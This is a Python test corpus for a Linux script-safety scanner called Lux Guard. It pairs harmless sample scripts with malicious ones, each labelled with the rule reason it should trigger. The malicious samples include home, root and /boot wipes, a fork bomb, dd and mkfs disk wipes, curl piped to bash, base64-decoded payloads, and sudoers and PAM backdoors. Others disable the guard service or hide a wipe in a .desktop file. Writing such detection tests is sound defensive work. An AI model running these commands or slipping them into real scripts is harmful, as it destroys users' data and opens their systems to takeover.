"""Lux Guard - sbirka vzorku pro heuristiku (test_corpus.py).

BAD: skutecne nebezpecne vzory - musi zustat kriticke s danym duvodem (nikdy neoslabit).
GOOD: bezne skripty, pomocnici PKGBUILD, hooky gitu, instalatory dotfiles - nesmi byt kriticke.
Vzorky jsou jen text v Pythonu (zadny spustitelny soubor na disku, nic se nespousti).
"""
import luxos_guard_rules as R

# jmeno -> (nazev souboru, obsah, ocekavany duvod)
BAD = {
    "wipe home": ("setup.sh", "#!/bin/bash\necho Installing codec...\nrm -rf ~/*\n", R.R_DELETE),
    "wipe home var": ("clean.sh", "#!/bin/sh\nrm -rf \"$HOME\"\n", R.R_DELETE),
    "wipe root": ("fix.sh", "#!/bin/bash\nsudo rm -rf --no-preserve-root /\n", R.R_DELETE),
    "fork bomb": ("speed.sh", "#!/bin/bash\n:(){ :|:& };:\n", R.R_FORK),
    "dd disk": ("boost.sh", "#!/bin/bash\nsudo dd if=/dev/zero of=/dev/sda bs=1M\n", R.R_DISK),
    "mkfs disk": ("fmt.sh", "#!/bin/bash\nsudo mkfs.ext4 -F /dev/nvme0n1\n", R.R_DISK),
    "curl pipe": ("install.sh", "#!/bin/bash\ncurl -fsSL http://example.invalid/x.sh | bash\n", R.R_REMOTE),
    "base64 pipe": ("run.sh", "#!/bin/bash\necho cm0gLXJmIH4K | base64 -d | bash\n", R.R_HIDDEN),
    "sudoers": ("perm.sh", "#!/bin/bash\necho 'me ALL=(ALL) NOPASSWD: ALL' | sudo tee -a /etc/sudoers\n", R.R_AUTH),
    "pam edit": ("login.sh", "#!/bin/bash\nsudo sed -i '2 i auth sufficient pam_permit.so' /etc/pam.d/system-auth\n",
                 R.R_AUTH),
    "pam rewrite": ("sssd.sh", "#!/bin/bash\ncat << EOF > /etc/pam.d/sssd-arch\nauth sufficient pam_sss.so\nEOF\n"
                    "sed -i '2 i auth include sssd-arch' /etc/pam.d/system-auth\n", R.R_AUTH),
    "chmod root": ("perms.sh", "#!/bin/bash\nsudo chmod -R 777 /\n", R.R_PERMS),
    "sysrq": ("reboot.sh", "#!/bin/bash\necho c | sudo tee /proc/sysrq-trigger\n", R.R_KERNEL),
    "guard off": ("game.sh", "#!/bin/bash\nsudo systemctl disable --now luxos-guard\n./game\n", R.R_GUARD),
    "boot": ("clean.sh", "#!/bin/bash\nsudo rm -rf /boot/*\n", R.R_BOOT),
    "python rm home": ("tool.py", "#!/usr/bin/env python3\nimport os\nos.system('rm -rf ~')\n", R.R_DELETE),
    "python rmtree home": ("tool.py", "#!/usr/bin/env python3\nimport shutil, pathlib\n"
                           "shutil.rmtree(pathlib.Path.home())\n", R.R_DELETE),
    "python exec b64": ("tool.py", "#!/usr/bin/env python3\nimport base64\n"
                        "exec(base64.b64decode('cHJpbnQoMSk='))\n", R.R_HIDDEN),
    "desktop wipe": ("movie.desktop", "[Desktop Entry]\nType=Application\nName=Movie\nExec=sh -c 'rm -rf ~'\n",
                     R.R_DELETE),
}

# jmeno -> (nazev souboru, obsah)
GOOD = {
    "git pre-commit sample": ("pre-commit.sample", """#!/bin/sh
# An example hook script to verify what is about to be committed.
if git rev-parse --verify HEAD >/dev/null 2>&1
then
	against=HEAD
else
	against=$(git hash-object -t tree /dev/null)
fi
exec 1>&2
if test $(git diff --cached --name-only --diff-filter=A -z $against | LC_ALL=C tr -d '[ -~]\\0' | wc -c) != 0
then
	echo "Error: Attempt to add a non-ASCII file name."
	exit 1
fi
exec git diff-index --check --cached $against --
"""),
    "git update sample": ("update.sample", """#!/bin/sh
refname="$1"
oldrev="$2"
newrev="$3"
if [ -z "$GIT_DIR" ]; then
	echo "Don't run this script from the command line." >&2
	exit 1
fi
zero=$(git hash-object --stdin </dev/null | tr '[0-9a-f]' '0')
if [ "$newrev" = "$zero" ]; then
	newrev_type=delete
else
	newrev_type=$(git cat-file -t $newrev)
fi
exit 0
"""),
    "PKGBUILD": ("PKGBUILD", """# Maintainer: someone
pkgname=hello
pkgver=1.0
pkgrel=1
arch=(x86_64)
source=("https://example.invalid/hello-$pkgver.tar.gz")
sha256sums=('SKIP')
build() {
    cd "$srcdir/hello-$pkgver"
    sed -i 's|/usr/local|/usr|' Makefile
    make
}
package() {
    cd "$srcdir/hello-$pkgver"
    make DESTDIR="$pkgdir" install
    rm -rf "$pkgdir/usr/share/doc"
    install -Dm755 hello.sh "$pkgdir/usr/bin/hello"
    install -Dm644 LICENSE "$pkgdir/usr/share/licenses/$pkgname/LICENSE"
}
"""),
    "pacman install script": ("hello.install", """post_install() {
    systemctl daemon-reload
    echo "hello installed"
}
post_upgrade() {
    post_install
}
post_remove() {
    rm -f /etc/hello/cache.db
}
"""),
    "build helper": ("build.sh", """#!/bin/bash
set -euo pipefail
cd "$(dirname "$0")"
rm -rf build dist
mkdir -p build
sudo pacman -S --needed --noconfirm base-devel cmake
cmake -S . -B build -DCMAKE_BUILD_TYPE=Release
make -C build -j"$(nproc)"
find build -name '*.o' -delete
"""),
    "cache cleanup": ("clean-cache.sh", """#!/bin/bash
cache=${XDG_CACHE_HOME:-$HOME/.cache}/myapp
find "$cache" -type f -mtime +30 -delete
rm -rf "$cache/tmp"
"""),
    "dotfiles installer": ("install-dotfiles.sh", """#!/bin/bash
here=$(cd "$(dirname "$0")" && pwd)
for f in .bashrc .vimrc .gitconfig; do
    ln -sf "$here/$f" "$HOME/$f"
done
mkdir -p ~/.config
cp -r "$here"/config/* ~/.config/
echo 'export PATH="$HOME/.local/bin:$PATH"' >> ~/.bashrc
"""),
    "backup rsync": ("backup.sh", """#!/bin/bash
dest=/run/media/$USER/backup
[ -d "$dest" ] || { echo "backup disk not connected"; exit 1; }
rsync -a --delete "$HOME/Documents/" "$dest/Documents/"
rsync -a --delete "$HOME/Pictures/" "$dest/Pictures/"
"""),
    "game launcher": ("start.sh", """#!/bin/bash
cd "$(dirname "$(readlink -f "$0")")"
export LD_LIBRARY_PATH="$PWD/lib:${LD_LIBRARY_PATH:-}"
exec ./game.x86_64 "$@"
"""),
    "python build clean": ("make_release.py", """#!/usr/bin/env python3
import shutil
import subprocess
from pathlib import Path
root = Path(__file__).resolve().parent
build = root / "build"
shutil.rmtree(build, ignore_errors=True)
build.mkdir()
subprocess.run(["python3", "-m", "build", "--outdir", str(build)], check=True, cwd=root)
"""),
    "service helper": ("restart-app.sh", """#!/bin/bash
systemctl --user restart myapp.service
journalctl --user -u myapp.service -n 20 --no-pager
"""),
    "disk info": ("disks.sh", """#!/bin/bash
lsblk -o NAME,SIZE,FSTYPE,MOUNTPOINT
sudo fdisk -l /dev/sda
df -h
"""),
}
